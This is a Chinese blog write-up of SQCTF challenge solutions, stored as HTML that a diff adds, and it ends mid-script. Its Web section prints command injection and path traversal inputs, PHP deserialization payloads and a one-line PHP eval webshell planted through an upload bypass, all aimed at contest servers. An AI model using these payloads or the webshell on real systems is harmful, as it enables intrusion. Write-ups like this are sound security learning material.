@@ -1,0 +1,1482 @@
+
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8" />
+    <title>SQCTF部分题目WP | PR0_M1X 的小站</title>
+    <meta name="author" content="PR0_M1X" />
+    <meta name="description" content="自力更生 艰苦奋斗" />
+    <meta name="keywords" content="CTF" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>PR0_M1X 的小站</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a target="_blank" rel="noopener" href="http://gz.crispsheep.icu:5000/display">
+            <i class="fa-solid fa-eye fa-fw"></i>
+            <span>&ensp;Observe</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;PR0_M1X 的小站</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+                <a target="_blank" rel="noopener" href="http://gz.crispsheep.icu:5000/display">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-eye fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Observe</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>SQCTF部分题目WP</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/4/13
+        </span>
+        
+        <span class="category">
+            <a href="/categories/Writeup/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Writeup
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/Writeup/" style="color: #ff7d73">
+                    Writeup
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Misc/" style="color: #03a9f4">
+                    Misc
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Pwn/" style="color: #00a596">
+                    Pwn
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/CTF/" style="color: #03a9f4">
+                    CTF
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Crypto/" style="color: #00a596">
+                    Crypto
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Reverse/" style="color: #ff7d73">
+                    Reverse
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/Web/" style="color: #00bcd4">
+                    Web
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>打得是挺酣畅淋漓的，但是脑洞题有点多<br>逆向ak了两轮，第三轮实在是k不动了</p>
+<span id="more"></span>
+
+<h1 id="Misc-解出9题"><a href="#Misc-解出9题" class="headerlink" title="Misc 解出9题"></a>Misc 解出9题</h1><h2 id="可否许我再少年"><a href="#可否许我再少年" class="headerlink" title="可否许我再少年"></a>可否许我再少年</h2><p>问卷题不再赘述</p>
+<h2 id="ez-music1"><a href="#ez-music1" class="headerlink" title="ez_music1"></a>ez_music1</h2><p>AU看一下频谱图就能看到flag了</p>
+<p>SQCTF{Rush_B}</p>
+<h2 id="ez-music2"><a href="#ez-music2" class="headerlink" title="ez_music2"></a>ez_music2</h2><p>给了两个音频，对齐后反相一下调整一下两个通道的音量，可以得到一个sstv音频，解码一下即可<br>SQCTF{Cute_Tiger}</p>
+<h2 id="love-host"><a href="#love-host" class="headerlink" title="love.host"></a>love.host</h2><p>用binwalk跑了一下，文件尾部有一个zip压缩包</p>
+<p>提取出来解压就得到了flag</p>
+<p>sqctf{Sun Ensheng is the most handsome.}</p>
+<h2 id="Welcome-Sign-in"><a href="#Welcome-Sign-in" class="headerlink" title="Welcome_Sign_in"></a>Welcome_Sign_in</h2><p>签到题，不再赘述了</p>
+<h2 id="这是什么加密"><a href="#这是什么加密" class="headerlink" title="这是什么加密"></a>这是什么加密</h2><p>这是base2048加密<br>SQCTF{97F586A3-302C-7163-3C13-32C32C58DBBE}</p>
+<h2 id="piet"><a href="#piet" class="headerlink" title="piet"></a>piet</h2><p>piet加密，随便找个工具跑一下就能得到结果</p>
+<p>SQCTF{Hello world!}</p>
+<h2 id="FFT-IFFT"><a href="#FFT-IFFT" class="headerlink" title="FFT IFFT"></a>FFT IFFT</h2><p>逆FFT变换，写个脚本即可</p>
+<pre><code class="python">import os
+import cv2
+import struct
+import numpy as np
+
+def restore_frame(m_frame, p_frame, m_min, m_max):
+    # 反归一化幅度谱
+    m_normalized = m_frame.astype(np.float32) / 255.0
+    log_m = m_normalized * (m_max - m_min) + m_min
+    magnitude = np.exp(log_m)
+    
+    # 反归一化相位谱
+    p_normalized = p_frame.astype(np.float32) / 255.0
+    phase = p_normalized * (2 * np.pi) - np.pi
+    
+    # 重建复数FFT矩阵
+    fft_complex = magnitude * (np.cos(phase) + 1j * np.sin(phase))
+    
+    # 逆FFT变换
+    fft_ishift = np.fft.ifftshift(fft_complex)
+    img_complex = np.fft.ifft2(fft_ishift)
+    img = np.abs(img_complex).clip(0, 255).astype(np.uint8)
+    
+    return img
+
+if __name__ == &#39;__main__&#39;:
+    # 创建目录
+    os.makedirs(&#39;restored_frames&#39;, exist_ok=True)
+    
+    # 提取1.mkv和2.mkv的帧
+    os.system(&#39;ffmpeg -i 1.mkv m/%03d.png&#39;)
+    os.system(&#39;ffmpeg -i 2.mkv p/%03d.png&#39;)
+    
+    # 读取r文件中的min/max值
+    min_max_list = []
+    with open(&#39;r&#39;, &#39;rb&#39;) as r_file:
+        data = r_file.read()
+        for i in range(len(data) // 8):
+            min_val, max_val = struct.unpack(&#39;!ff&#39;, data[i*8:(i+1)*8])
+            min_max_list.append((min_val, max_val))
+    
+    # 处理每一帧
+    frame_count = len(min_max_list)
+    for i in range(1, frame_count + 1):
+        filename = f&quot;&#123;i:03d&#125;.png&quot;
+        m_img = cv2.imread(f&#39;m/&#123;filename&#125;&#39;, cv2.IMREAD_GRAYSCALE)
+        p_img = cv2.imread(f&#39;p/&#123;filename&#125;&#39;, cv2.IMREAD_GRAYSCALE)
+        
+        # 恢复原始帧
+        restored_img = restore_frame(m_img, p_img, *min_max_list[i-1])
+        cv2.imwrite(f&#39;restored_frames/&#123;filename&#125;&#39;, restored_img)
+    
+    # 合成视频
+    os.system(&#39;ffmpeg -framerate 25 -i restored_frames/%03d.png -c:v libx264 -crf 18 -pix_fmt yuv420p restored_secret.mp4&#39;)
+</code></pre>
+<p>SQCTF{HELLO}</p>
+<h2 id="孩儿们等我破军"><a href="#孩儿们等我破军" class="headerlink" title="孩儿们等我破军"></a>孩儿们等我破军</h2><p>压缩包密码是爆破出来的，15375022是密码</p>
+<p>解出来后给了6个铁剑，有不同的编号。解一下附图给的矩阵就有顺序了。<br>$$<br>A &#x3D; \begin{pmatrix}<br>1 &amp; 2 \<br>3 &amp; 4 \<br>\end{pmatrix}</p>
+<p>B &#x3D; \begin{pmatrix}<br>7 &amp; 5 &amp; 6 \<br>4 &amp; 9 &amp; 8 \<br>\end{pmatrix}</p>
+<p>\ AB &#x3D; \begin{pmatrix} 15 &amp; 23 &amp; 22 \ 37 &amp; 51 &amp; 50 \end{pmatrix} <br>$$<br>然后按照这个顺序在6个铁剑的文件尾能找到reflect&#x3D;{}这样格式的特征，把花括号的内容拼一块<br><code>WeL1c0Me</code>这就是222的密码<br>解出来一个风暴巨剑，文件尾有一个密码<code>O5XXOILUMETXGIDDORTGK4R7EE======</code></p>
+<p>base32解一下解出来<code>wow!ta&#39;s ctfer?!</code></p>
+<p>作为快了快了的密码</p>
+<p>解出来一个二维码，进行处理后扫描，得到<code>ZmxhZ3vkurLniLHnmoTlj6zllKTluIjvvJrmrKLov47mnaXliLBzcW51Y3Rm77yBfQ==</code></p>
+<p>解base64得到<code>flag&#123;亲爱的召唤师：欢迎来到sqnuctf！&#125;</code></p>
+<h1 id="Web-解出14题"><a href="#Web-解出14题" class="headerlink" title="Web 解出14题"></a>Web 解出14题</h1><h2 id="RceMe"><a href="#RceMe" class="headerlink" title="RceMe"></a>RceMe</h2><p>payload:<code>?com=nl /*</code></p>
+<p>sqctf{6de82d3312fb43f9a6f83e5d0b95888b}</p>
+<h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>payload:<code>?ip=||cat /flag</code></p>
+<p>sqctf{2adcc57a42e14593b4cb313294086f81}</p>
+<h2 id="Through"><a href="#Through" class="headerlink" title="Through"></a>Through</h2><p>burp爆出来的</p>
+<p>payload:<code>?file=..././..././..././..././..././..././..././..././..././..././flag</code></p>
+<p>sqctf{c1de40febed845e5bae38429a416f1d5}</p>
+<h2 id="Input-a-Number"><a href="#Input-a-Number" class="headerlink" title="Input a Number"></a>Input a Number</h2><p>简单的进制转换<br>payload:<code>?sqctf=0337522</code></p>
+<p>sqctf{609c716a66f14179970636df2abe6478}</p>
+<h2 id="Ez-calculate"><a href="#Ez-calculate" class="headerlink" title="Ez_calculate"></a>Ez_calculate</h2><p>用自动化做的，附脚本</p>
+<pre><code class="python">from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.edge.options import Options
+
+# 配置Edge选项
+edge_options = Options()
+edge_options.add_experimental_option(&quot;detach&quot;, True)  # 保持浏览器窗口打开
+edge_options.use_chromium = True  # 使用Chromium内核的Edge
+
+# 初始化Edge浏览器
+driver = webdriver.Edge(options=edge_options)
+
+try:
+    # 访问本地HTML文件（修改为实际路径）
+    driver.get(&quot;http://challenge.qsnctf.com:32271/&quot;)
+    
+    # 获取并处理算式
+    challenge = driver.find_element(By.CLASS_NAME, &#39;challenge&#39;).text
+    cleaned_expression = challenge.replace(&#39;×&#39;, &#39;*&#39;).replace(&#39;÷&#39;, &#39;/&#39;)  # 处理特殊符号
+    
+    # 安全计算（示例使用eval，实际生产环境建议使用更安全的方式）
+    result = eval(cleaned_expression)
+    print(f&quot;计算结果：&#123;cleaned_expression&#125; = &#123;result&#125;&quot;)
+    
+    # 填写并提交表单
+    driver.find_element(By.NAME, &#39;value&#39;).send_keys(str(int(result)))
+    driver.find_element(By.TAG_NAME, &#39;button&#39;).click()
+    
+    # 保持窗口打开的额外保险措施
+    input(&quot;按回车键结束程序（浏览器将保持打开）...&quot;)
+
+except Exception as e:
+    print(f&quot;执行出错: &#123;str(e)&#125;&quot;)
+    input(&quot;按回车键退出...&quot;)
+finally:
+    # 移除了 driver.quit() 以保持浏览器打开
+    pass
+</code></pre>
+<p><code>sqctf&#123;a0aee6ee12b34a859f33a80d80068fc1&#125;</code></p>
+<p>后来发现直接进&#x2F;flag路由就能拿到了</p>
+<h2 id="哎呀大大大黑塔"><a href="#哎呀大大大黑塔" class="headerlink" title="哎呀大大大黑塔"></a>哎呀大大大黑塔</h2><p>脑洞题，SQNU变量赋值为大黑塔pv的bv号<code>BV1tXckehEd3</code>就能跳转到题目处了</p>
+<p>反序列化漏洞<br>payload:<code>data=O:6:&quot;Secret&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;SQCTF&quot;;&#125;</code></p>
+<p>POST上去就能拿到flag</p>
+<p>flag : sqctf{5542b837ab8b4e0fb300f9b133eb1ed8}</p>
+<h2 id="Upload-Level2"><a href="#Upload-Level2" class="headerlink" title="Upload_Level2"></a>Upload_Level2</h2><p>跟Upload_Level1操作手法差不多，文件后缀改成php，加一步：Content-Type改成image&#x2F;png就能把马挂上去<br>sqctf{389295fbb5344c43a6c44e30c3f3a5ab}</p>
+<h2 id="ezGame"><a href="#ezGame" class="headerlink" title="ezGame"></a>ezGame</h2><p>这个题不清楚具体是怎么回事，玩了一会儿输了就拿到flag了</p>
+<p>sqctf{5a0b69dca2304502a91678dc88fb15fc}</p>
+<h2 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby rce"></a>baby rce</h2><p>变量覆盖与static方法调用，以及sha1弱比较</p>
+<p>get这块：<code>?param1[]=1&amp;param2[]=1?computer_number=20</code></p>
+<p>post这块：<code>payload=TYctf::getKey</code></p>
+<p>sqctf{5bc3bc7d288e453f84a1f7945ed40468}</p>
+<h2 id="商师一日游"><a href="#商师一日游" class="headerlink" title="商师一日游"></a>商师一日游</h2><p>综合性很强的题目</p>
+<ol>
+<li>查看源代码获取第一处sqctf{，然后跳转到&#x2F;atc2cnzd.php</li>
+<li>burp拦截，把Cookie参数中fish&#x3D;weak改为fish&#x3D;strong即可获取第二处d836，然后跳转到&#x2F;atc3oklm.php</li>
+<li>在开发者工具中进入网络选项卡，刷新一次页面，在&#x2F;atc3oklm.php的标头中找到第三处90754f，跳转到&#x2F;atc4zztg.php</li>
+<li>转到&#x2F;robots.txt，得到第四处a049dfb，跳转到&#x2F;atc5uupl.php</li>
+<li>代码审计，构建payload：<code>?hhh=Php%0A114514</code>，得到第五处b1d8fb27，跳转到&#x2F;atc6ertg.php</li>
+<li>打开开发者工具，用左上角的指针点一下按钮，把disabled删去，再点击按钮即可得到第六处7037c，跳转到&#x2F;atc7wedf.php</li>
+<li>直接用蚁剑连接<code>http://challenge.qsnctf.com:31989/atc7wedf.php</code>，密码为memory，拿到了webshell，在本目录找到第七处1d}</li>
+</ol>
+<p>拼合起来，得到flag</p>
+<p>sqctf{d83690754fa049dfbb1d8fb277037c1d}</p>
+<h2 id="My-Blog"><a href="#My-Blog" class="headerlink" title="My Blog"></a>My Blog</h2><p>简单的信息收集。</p>
+<p>从github页找到了后台管理员账户密码</p>
+<p>然后通过robots.txt找到后台登录页面</p>
+<p>进入输入前面获得的用户名密码即可获得flag</p>
+<p><strong>sqctf{c26d9a997254476eac1e7dca3cc2a6fd}</strong></p>
+<h2 id="Upload-Level1"><a href="#Upload-Level1" class="headerlink" title="Upload_Level1"></a>Upload_Level1</h2><p>上传一个内容为<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>的jpg格式文件，burp拦截，文件后缀改为.php</p>
+<p>放行，用蚁剑连接<code>http://challenge.qsnctf.com:32656/upload/horse.php</code>，密码为cmd，在根目录即可得到flag</p>
+<p>sqctf{e5240cc047b94cd5a4f9bea3eea583af}</p>
+<h2 id="eeaassyy"><a href="#eeaassyy" class="headerlink" title="eeaassyy"></a>eeaassyy</h2><p>用浏览器菜单栏打开开发者工具即可获取</p>
+<p>sqctf{295a62f0af1049728c7874d267554203}</p>
+<h2 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h2><p>我们需要构造一个序列化的字符串，表示一个 <code>test</code> 类的对象，并且该对象的 <code>$pswd</code> 属性值为 <code>&#39;escaping&#39;</code>。序列化后的字符串如下：</p>
+<pre><code>O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:4:&quot;test&quot;;s:4:&quot;pswd&quot;;s:8:&quot;escaping&quot;;&#125;
+</code></pre>
+<p><strong>利用方式:</strong></p>
+<p>将上述 payload 作为 GET 参数 <code>payload</code> 的值发送给 PHP 脚本。</p>
+<pre><code>http://challenge.qsnctf.com:30705/?payload=O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:4:&quot;test&quot;;s:4:&quot;pswd&quot;;s:8:&quot;escaping&quot;;&#125;
+</code></pre>
+<p>即可获得</p>
+<p>sqctf{f4cf35ec8c7d4d80a843d601ef5032fd}</p>
+<h1 id="Crypto-解出14题"><a href="#Crypto-解出14题" class="headerlink" title="Crypto 解出14题"></a>Crypto 解出14题</h1><h2 id="base？"><a href="#base？" class="headerlink" title="base？"></a>base？</h2><p>换表base64，用的是cyberchef中z64这个表</p>
+<p>SQCTF{b7b48685-03ef-4e24-b25b-212fac2ec2d3}</p>
+<h2 id="密室逃脱的终极挑战"><a href="#密室逃脱的终极挑战" class="headerlink" title="密室逃脱的终极挑战"></a>密室逃脱的终极挑战</h2><p>ida打开直接找到了flag</p>
+<p>SQCTF{F4BBAC33-8D80-A886-5238-EA35B38B353A}</p>
+<h2 id="小白兔白又白"><a href="#小白兔白又白" class="headerlink" title="小白兔白又白"></a>小白兔白又白</h2><p>脑洞题<br>base91-&gt;base64-&gt;base62-&gt;base16-&gt;rabbit（密钥233）<br>SQCTF{LOOK_my_eyes_baby_why?}</p>
+<h2 id="玩的挺变态啊清茶哥"><a href="#玩的挺变态啊清茶哥" class="headerlink" title="玩的挺变态啊清茶哥"></a>玩的挺变态啊清茶哥</h2><p>猪圈密码<br>SQCTF{jijibaotonghualizuoyingxiong}</p>
+<h2 id="字母的轮舞与维吉尼亚的交响曲"><a href="#字母的轮舞与维吉尼亚的交响曲" class="headerlink" title="字母的轮舞与维吉尼亚的交响曲"></a>字母的轮舞与维吉尼亚的交响曲</h2><p>没用常规方法做，直接爆破了<br>先把原文扔给Vigenère Solver爆破得到</p>
+<pre><code>I thought of these words again from &quot;One Hundred Years of Solitude.&quot; Lonelyness is a curse of creation to the group, and solitude is the only outlet for loneliness.Perhaps it was at this point that I finally understood Colonel Buendía and José Arcadio.Our hometown becomes a place we love not because it is our hometown, but because we believe it to be our hometown. Home is used as a place to rest a drifting soul, and that is why it smells of decay and death, like withered leaves and deserted yellow soil. To return home is to break the concept of &quot;me&quot; back into &quot;us,&quot; to be integrated into such a huge whole that slowly becomes invisible, Macondo, the City of Mirrors.“On a winter night, the soup pot was boiling on the stove, but he missed the sweltering heat in the back hall of the bookstore. The hum of the sun&#39;s rays on the dusty almond trees, the faint sirens of the midday meal, as he had in Macondo yearned for the soup on the stove in winter, the call of the coffee-peddler, and the swift flight of the larks in spring. VTFWI&#123;brx_duh_zlq!&#125;&quot;Rizhao,&quot; he said, turning to Macondo. The two types of nostalgia were like mirrors opposite, and he was stuck in between, confused, unable to maintain a sublime transcendence.”
+</code></pre>
+<p>对<code>VTFWI&#123;brx_duh_zlq!&#125;</code>做凯撒枚举，得到flag<br>SQCTF{you_are_win!}</p>
+<h2 id="别阴阳我了行吗？"><a href="#别阴阳我了行吗？" class="headerlink" title="别阴阳我了行吗？"></a>别阴阳我了行吗？</h2><p>阴阳怪气解码</p>
+<p>SQCTF{xm！tql！xm！}</p>
+<h2 id="你的天赋是什么"><a href="#你的天赋是什么" class="headerlink" title="你的天赋是什么"></a>你的天赋是什么</h2><p>摩斯密码解一下即可</p>
+<p>SQCTF{YOU-HAVE-TALENT}</p>
+<h2 id="简单RSA"><a href="#简单RSA" class="headerlink" title="简单RSA"></a>简单RSA</h2><p>模数n可以通过factordb得到p和q两个数</p>
+<pre><code class="python">e = 65537
+n = 7349515423675898192891607474991784569723846586810596813062667159281369435049497248016288479718926482987176535358013000103964873016387433732111229186113030853959182765814488023742823409594668552670824635376457830121144679902605863066189568406517231831010468189513762519884223049871926129263923438273811831862385651970651114186155355541279883465278218024789539073180081039429284499039378226284356716583185727984517316172565250133829358312221440508031140028515954553016396884149904097959425582366305748700291610280675014390376786701270107136492645593662763444032174543205008326706371954830419775515459878227148997362533
+c = 3514741378432598036735573845050830323348005144476193092687936757918568216312321624978086999079287619464038817665467748860146219342413630364856274551175367026504110956407511224659095481178589587424024682256076598582558926372354316897644421756280217349588811321954271963531507455604340199167652015645135632177429144241732132275792156772401511326430069756948298403519842679923368990952555264034164975975945747016304948179325381238465171723427043140473565038827474908821764094888942553863124323750256556241722284055414264534546088842593349401380142164927188943519698141315554347020239856047842258840826831077835604327616
+
+# Factors from factordb
+p = 85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863611867388261
+q = 85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863614460682753
+
+# Verify that p and q are correct
+assert p * q == n
+
+# Compute phi(n)
+phi = (p - 1) * (q - 1)
+
+# Compute the private key d
+d = pow(e, -1, phi)
+
+# Decrypt the ciphertext
+m = pow(c, d, n)
+
+# Convert the message to bytes
+message_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#39;big&#39;)
+
+print(&quot;Decrypted message:&quot;, message_bytes.decode(&#39;utf-8&#39;))
+</code></pre>
+<p>Decrypted message: SQCTF{be7e48547356cdf16649fd29e0ff9e1f}</p>
+<h2 id="春风得意马蹄疾"><a href="#春风得意马蹄疾" class="headerlink" title="春风得意马蹄疾"></a>春风得意马蹄疾</h2><p>嵌套的核心价值观编码，将每次解码出的内容再次解码，就能得到flag</p>
+<p>SQCTF{E2jacnicamcm_cnanamw_kwkma}</p>
+<h2 id="ezCRT"><a href="#ezCRT" class="headerlink" title="ezCRT"></a>ezCRT</h2><p>中国剩余定理</p>
+<pre><code class="python">from gmpy2 import iroot
+from Crypto.Util.number import long_to_bytes
+
+n1 = 64461804435635694137780580883118542458520881333933248063286193178334411181758377012632600557019239684067421606269023383862049857550780830156513420820443580638506617741673175086647389161551833417527588094693084581758440289107240400738205844622196685129086909714662542181360063597475940496590936680150076590681
+n2 = 82768789263909988537493084725526319850211158112420157512492827240222158241002610490646583583091495111448413291338835784006756008201212610248425150436824240621547620572212344588627328430747049461146136035734611452915034170904765831638240799554640849909134152967494793539689224548564534973311777387005920878063
+n3 = 62107516550209183407698382807475681623862830395922060833332922340752315402552281961072427749999457737344017533524380473311833617485959469046445929625955655230750858204360677947120339189429659414555499604814322940573452873813507553588603977672509236539848025701635308206374413195614345288662257135378383463093
+
+c1 = 36267594227441244281312954686325715871875404435399039074741857061024358177876627893305437762333495044347666207430322392503053852558456027453124214782206724238951893678824112331246153437506819845173663625582632466682383580089960799423682343826068770924526488621412822617259665379521455218674231901913722061165
+c2 = 58105410211168858609707092876511568173640581816063761351545759586783802705542032125833354590550711377984529089994947048147499585647292048511175211483648376727998630887222885452118374649632155848228993361372903492029928954631998537219237912475667973649377775950834299314740179575844464625807524391212456813023
+c3 = 23948847023225161143620077929515892579240630411168735502944208192562325057681298085309091829312434095887230099608144726600918783450914411367305316475869605715020490101138282409809732960150785462082666279677485259918003470544763830384394786746843510460147027017747048708688901880287245378978587825576371865614
+
+# 使用中国剩余定理求解 m^3 ≡ c mod n1*n2*n3
+def crt(a, n):
+    sum = 0
+    prod = 1
+    for ni in n:
+        prod *= ni
+    
+    for ai, ni in zip(a, n):
+        p = prod // ni
+        sum += ai * pow(p, -1, ni) * p
+    return sum % prod
+
+m_cubed = crt([c1, c2, c3], [n1, n2, n3])
+
+# 因为 m^3 &lt; n1*n2*n3，可以直接开立方
+m, is_perfect_cube = iroot(m_cubed, 3)
+if is_perfect_cube:
+    print(&quot;Found m:&quot;, long_to_bytes(m))
+else:
+    print(&quot;Failed to find perfect cube root&quot;)
+</code></pre>
+<p>SQCTF{CRT_Unl0cks_RSA_Eff1c13ncy}</p>
+<h2 id="ez-SCA"><a href="#ez-SCA" class="headerlink" title="ez_SCA"></a>ez_SCA</h2><p>AI写的</p>
+<pre><code class="python">import numpy as np
+
+# 加载模板轨迹文件
+template_trace_0 = np.load(&#39;template_trace_0.npy&#39;)
+template_trace_1 = np.load(&#39;template_trace_1.npy&#39;)
+
+# 加载能量轨迹文件
+traces = np.load(&#39;energy_traces_with_flag.npy&#39;)
+
+def bits_to_text(bits):
+    chars = [bits[i:i+8] for i in range(0, len(bits), 8)]
+    text = &#39;&#39;.join([chr(int(char, 2)) for char in chars])
+    return text
+
+# 假设每个能量轨迹对应 flag 的一个比特
+recovered_bits = []
+for trace in traces:
+    # 计算当前能量轨迹与模板轨迹 0 的均方误差
+    mse_0 = np.mean((trace - template_trace_0) ** 2)
+    # 计算当前能量轨迹与模板轨迹 1 的均方误差
+    mse_1 = np.mean((trace - template_trace_1) ** 2)
+
+    # 如果与模板轨迹 0 的均方误差更小，则认为该比特为 0
+    if mse_0 &lt; mse_1:
+        recovered_bits.append(&#39;0&#39;)
+    else:
+        recovered_bits.append(&#39;1&#39;)
+
+# 将恢复的比特列表连接成字符串
+recovered_bits_str = &quot;&quot;.join(recovered_bits)
+
+# 将恢复的比特字符串转换为文本
+flag = bits_to_text(recovered_bits_str)
+
+print(&quot;Recovered flag:&quot;, flag)
+</code></pre>
+<p>SQCTF{easy_funny_and_not_hard_sca_hhh_just_kingdding}</p>
+<h2 id="丢三落四的小I"><a href="#丢三落四的小I" class="headerlink" title="丢三落四的小I"></a>丢三落四的小I</h2><p>仅dp泄露类型，工具直接一把梭<br>SQCTF{7b909221-c8ff-f391-0c86-d3a9ca8491d1}</p>
+<h2 id="Common-Modulus"><a href="#Common-Modulus" class="headerlink" title="Common Modulus"></a>Common Modulus</h2><p>共模攻击，同样工具直接一把梭<br>SQCTF{06774dcf-b9d1-3c2d-8917-7d2d86b6721c}</p>
+<h2 id="失落矿洞中的密码"><a href="#失落矿洞中的密码" class="headerlink" title="失落矿洞中的密码"></a>失落矿洞中的密码</h2><p>ECC类型，给出脚本</p>
+<pre><code class="python">import time
+
+# --- Elliptic Curve Parameters ---
+a = 1234577
+b = 3213242
+p = 7654319
+
+# --- Base Point G ---
+Gx = 5234568
+Gy = 2287747
+G = (Gx, Gy)
+
+# --- Public Key (Target) ---
+Px = 2366653
+Py = 1424308
+PublicKey = (Px, Py)
+
+# --- Modular Inverse Function ---
+# Requires Python 3.8+ for pow(x, -1, p)
+def inverse_mod(k, p):
